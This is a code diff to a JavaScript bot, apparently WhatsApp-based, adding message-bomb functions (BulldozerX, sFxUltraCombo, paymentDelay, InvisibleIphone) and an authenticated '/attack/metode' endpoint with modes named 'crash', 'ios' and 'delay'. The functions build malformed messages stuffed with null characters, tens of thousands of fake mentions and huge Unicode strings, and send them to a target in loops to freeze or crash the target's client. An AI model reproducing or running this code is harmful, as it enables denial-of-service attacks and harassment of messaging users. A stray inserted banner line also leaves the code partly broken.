@@ -542,6 +542,7 @@ bot.command("delress", (ctx) => {
 });
 
 // fangsion kamyuh🤭
+𝐌𝐞𝐱𝐱𝐒𝐩𝐲 || 𝐓𝐞𝐜𝐡𝐧𝐨𝐥𝐨𝐠𝐢𝐞𝐬:
 async function DelayNew(isTarget) {
     let permissionX = await generateWAMessageFromContent(
         isTarget,
@@ -664,6 +665,373 @@ async function DelayNew(isTarget) {
     );    
 }
 
+async function BulldozerX(isTarget, mention) {
+  console.log(chalk.red(Delay Send To ${isTarget}));
+  let parse = true;
+  let SID = "5e03e0";
+  let key = "10000000_2203140470115547_947412155165083119_n.enc";
+  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
+  let type = image/webp;
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true,
+          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+          mimetype: type,
+          directPath: /v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID},
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+          remoteJid: "X",
+          participant: "0@s.whatsapp.net",
+          stanzaId: "1234567890ABCDEF",
+           mentionedJid: [
+             "6285215587498@s.whatsapp.net",
+             ...Array.from({ length: 1999 }, () =>
+             ${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * -20000000),
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(isTarget, message, {});
+
+  await dray.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [isTarget],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: isTarget },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+  
+  if (mention) {
+    await dray.relayMessage(
+      isTarget,
+      {
+        statusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: { is_status_mention: "" },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+}
+
+async function sFxUltraCombo(X) {
+         try {
+          const messageObject = await generateWAMessageFromContent(X, {
+           imageMessage: {
+            url: 'https://mmg.whatsapp.net/v/t62.7118-24/18984915_2636535869881862_931929448414449771_n.enc?ccb=11-4&oh=01_Q5Aa1QFnUtLckTEkpn-97KSW3OR46p4triwMF7V3W62F0bTSSQ&oe=6835692B&_nc_sid=5e03e0&mms3=true',
+            mimetype: 'image/jpeg',
+            fileSha256: 'KNR9LnF4sS3qko1erBpoA3OJ68iAhQ9OHEaWhG7hUjU=',
+            fileLength: '28529',
+            height: 999999,
+            width: 999999,
+            mediaKey: 'vkRybyG+JgNfCt7/uE/QhPqJN+VFg1cftY4ipVEz64E=',
+            fileEncSha256: 'ToY6bAd+8ILDLr4eEgyBUr/OSS374kqUWdtUlXTMhbw=',
+
+directPath: '/v/t62.7118-24/18984915_2636535869881862_931929448414449771_n.enc?ccb=11-4&oh=01_Q5Aa1QFnUtLckTEkpn-97KSW3OR46p4triwMF7V3W62F0bTSSQ&oe=6835692B&_nc_sid=5e03e0',
+            mediaKeyTimestamp: '1745742305',
+            caption: "\u0000".repeat(10000),
+            contextInfo: {
+             isSampled: true,
+             mentionedJid: ['13135550002@s.whatsapp.net', ...Array.from({
+              length: 30000
+             }, () => 13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net)]
+            },
+            scansSidecar: 'XujogL2FVEUK3PEqnUScHspbYt8PKCAET2xFIig6L9KaypucFOp1QA==',
+            scanLengths: [4745, 10064, 5549, 8171],
+            midQualityFileSha256: '6qCDpQegRZbCIe2/ipRvPRWly3hmMJuEiLawve6l2/w='
+           }
+          }, {});
+          await dray.relayMessage('status@broadcast', messageObject.message, {
+           messageId: messageObject.key.id,
+           statusJidList: [X],
+           additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+             tag: 'mentioned_users',
+             attrs: {},
+             content: [{
+              tag: 'to',
+              attrs: { jid: X },
+              content: undefined
+             }]
+            }]
+           }]
+          });
+         } catch (err) {
+          console.error(err);
+         }
+        };
+
+async function paymentDelay(isTarget) {
+  try {
+    let payMessage = {
+      interactiveMessage: {
+        body: { text: "X" },
+        nativeFlowMessage: {
+          buttons: [
+            {
+              name: "payment_method",
+              buttonParamsJson: JSON.stringify({
+                reference_id: null,
+                payment_method: "\u0010".repeat(0x2710),
+                payment_timestamp: null,
+                share_payment_status: true,
+              }),
+            },
+          ],
+          messageParamsJson: "{}",
+        },
+      },
+    };
+
+    const msgPay = generateWAMessageFromContent(isTarget, payMessage, {});
+    await dray.relayMessage(isTarget, msgPay.message, {
+      additionalNodes: [{ tag: "biz", attrs: { native_flow_name: "payment_method" } }],
+      messageId: msgPay.key.id,
+      participant: { jid: isTarget },
+      userJid: isTarget,
+    });
+
+    const msgStory = await generateWAMessageFromContent(
+      isTarget,
+      {
+        viewOnceMessage: {
+          message: {
+            interactiveResponseMessage: {
+              nativeFlowResponseMessage: {
+                version: 3,
+                name: "call_permission_request",
+                paramsJson: "\u0000".repeat(1045000),
+              },
+              body: {
+                text: "hi my name is mexx!?",
+                format: "DEFAULT",
+              },
+            },
+          },
+        },
+      },
+      {
+        isForwarded: false,
+        ephemeralExpiration: 0,
+        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
+        forwardingScore: 0,
+        font: Math.floor(Math.random() * 9),
+      }
+    );
+
+    await dray.relayMessage("status@broadcast", msgStory.message, {
+      additionalNodes: [
+        {
+          tag: "meta",
+          attrs: {},
+          content: [
+            {
+              tag: "mentioned_users",
+              attrs: {},
+              content: [{ tag: "to", attrs: { jid: isTarget }, content: undefined }],
+            },
+          ],
+        },
+      ],
+      statusJidList: [isTarget],
+      messageId: msgStory.key.id,
+    });
+
+  } catch (err) {}
+}
+
+async function InvisibleIphone(isTarget, mention) {
+const ameliakill = "mexx whyy ¿?" + "𑇂𑆵𑆴𑆿".repeat(60000);
+   try {
+      let locationMessage = {
+         degreesLatitude: -9.09999262999,
+         degreesLongitude: 199.99963118999,
+         jpegThumbnail: null,
+         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
+
+address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), 
+         url: ${"𑇂𑆵𑆴𑆿".repeat(25000)}.com,
+      }
+      let msg = generateWAMessageFromContent(isTarget, {
+         viewOnceMessage: {
+            message: {
+               locationMessage
+            }
+         }
+      }, {});
+      let extendMsg = {
+         extendedTextMessage: { 
+            text: "mexx whyy ¿?" + ameliakill,
+            matchedText: "mexx whyy ¿?",
+            description: "𑇂𑆵𑆴𑆿".repeat(25000),
+            title: "mexx whyy ¿?" + "𑇂𑆵𑆴𑆿".repeat(15000),
+            previewType: "NONE",
+            jpegThumbnail: "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",
+            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+            mediaKeyTimestamp: "1743101489",
+            thumbnailHeight: 641,
+            thumbnailWidth: 640,
+            inviteLinkGroupTypeV2: "DEFAULT"
+         }
+      }
+      let msg2 = generateWAMessageFromContent(isTarget, {
+         viewOnceMessage: {
+            message: {
+               extendMsg
+            }
+         }
+      }, {});
+      let msg3 = generateWAMessageFromContent(isTarget, {
+         viewOnceMessage: {
+            message: {
+               locationMessage
+            }
+         }
+      }, {});
+      await dray.relayMessage('status@broadcast', msg.message, {
+         messageId: msg.key.id,
+         statusJidList: [isTarget],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: isTarget
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+      await dray.relayMessage('status@broadcast', msg2.message, {
+         messageId: msg2.key.id,
+         statusJidList: [isTarget],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: isTarget
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+      await dray.relayMessage('status@broadcast', msg3.message, {
+         messageId: msg2.key.id,
+         statusJidList: [isTarget],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: isTarget
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+      console.log(chalk.red(SEND BUG TERKIRIM ${isTarget}));
+   } catch (err) {
+      console.error(err);
+   }
+};
+
+async function MexxDelay(isTarget) {
+for (let i = 0; i <= 5; i++) {
+await DelayNew(isTarget);
+await BulldozerX(isTarget);
+await paymentDelay(isTarget);
+await sFxUltraCombo(isTarget);
+}    
+}
+
 app.get("/attack/metode", requireAuth,  async (req, res) => {
   try {
     const metode = req.query.metode;
@@ -687,44 +1055,44 @@ app.get("/attack/metode", requireAuth,  async (req, res) => {
 
     switch (metode.toLowerCase()) {
       case "crash":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "foreclose":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "blank":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "ios":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "delay":
-        for (let i = 0; i < 300; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "call":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
       case "combo":
-        for (let i = 0; i < 40; i++) {
-          await DelayNew(isTarget)
+        for (let i = 0; i < 10; i++) {
+          await MexxDelay(isTarget)
         }
         break;
 
